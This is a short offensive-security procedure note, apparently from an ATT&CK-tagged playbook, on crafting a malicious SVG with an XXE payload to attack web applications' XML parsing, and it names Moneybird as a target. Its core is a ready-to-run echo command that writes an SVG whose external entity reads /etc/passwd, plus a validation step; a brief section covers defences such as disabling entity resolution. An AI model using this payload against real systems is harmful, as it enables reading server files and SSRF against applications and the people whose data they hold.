---
tags:
  - xxe
  - payload-crafting
type: procedure
tools: []
tactics:
  - '[[Initial Access]]'
commands:
  - '[[commands/craft-xxe-svg]]'
platforms:
  - Web
techniques:
  - '[[Exploit Public-Facing Application]]'
skill_level: intermediate
impact_level: medium
detection_risk: medium
sub_techniques: []
id: eda33e02-096e-4e42-84bf-105cdf1c750f
created_at: '2025-12-13T09:00:27.576Z'
updated_at: '2025-12-13T09:00:27.576Z'
verified: false
validated: true
submitted: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# Craft Malicious SVG with XXE Payload

## Summary

This procedure crafts a malicious SVG file incorporating an XXE payload to exploit insecure XML parsing in web applications.

## Description

SVG files are XML-based, and if parsed without disabling external entities, they can be used to inject XXE attacks. This targets applications like Moneybird, allowing access to internal files or SSRF. Prerequisites include basic XML knowledge and a text editor.

## Requirements

1. Text editor or command line access
2. Understanding of XXE payloads
3. Target file or resource to exfiltrate (e.g., /etc/passwd)

## Defense

Defensive measures and detection strategies:

- Use XML parsers with external entity resolution disabled (e.g., libxml2 with noent=0)
- Scan uploaded files for DOCTYPE and ENTITY declarations

## Objectives

1. Create SVG with embedded XXE
2. Reference internal or external entities
3. Prepare for upload and exploitation

## Instructions

### Step 1: Define XXE Payload

**Context**: Construct the XML structure with external entity.

Use [[commands/craft-xxe-svg]] to create the file:

```bash
echo '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><svg>&xxe;</svg>' > malicious.svg
```

> Explanation: This defines an entity that reads /etc/passwd and includes it in the SVG.

### Step 2: Validate Payload

**Context**: Check the file contents.

cat malicious.svg

> Expected: Valid XML with DOCTYPE and ENTITY.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]

### Techniques

- [[Exploit Public-Facing Application]]

### Sub-Techniques



## Commands Used

- [[commands/craft-xxe-svg]]

## Tools Used



## Tags

- [[xxe]]
- [[payload-crafting]]
